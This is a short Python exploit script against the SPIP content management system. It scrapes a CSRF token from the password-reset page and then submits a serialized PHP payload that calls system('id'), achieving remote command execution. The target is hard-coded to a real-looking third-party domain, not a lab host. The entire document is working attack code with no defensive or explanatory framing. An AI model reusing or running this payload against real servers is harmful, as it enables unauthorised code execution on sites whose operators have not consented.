import requests
import bs4

requests.packages.urllib3.disable_warnings()

url = 'http://mediatheque.cnd.fr'
r = requests.get(url+'/spip.php?page=spip_pass', timeout=10)

soup = bs4.BeautifulSoup(r.text, 'html.parser')
csrf = soup.find('input', {'name': 'formulaire_action_args'})
if csrf:
        csrf_value = csrf['value']
        
        payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len('id'), 'id')
        data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf_value,
        "oubli": payload}
        r = requests.post(url+'/spip.php?page=spip_pass' ,data=data)
        
        var = r.text
        soup1 = bs4.BeautifulSoup(var, 'html.parser')
        csrf1 = soup1.find_all('input')
        cs = str(list(csrf1)[3])
        
        
        
        print("\033[1;32m"+cs)

        
  
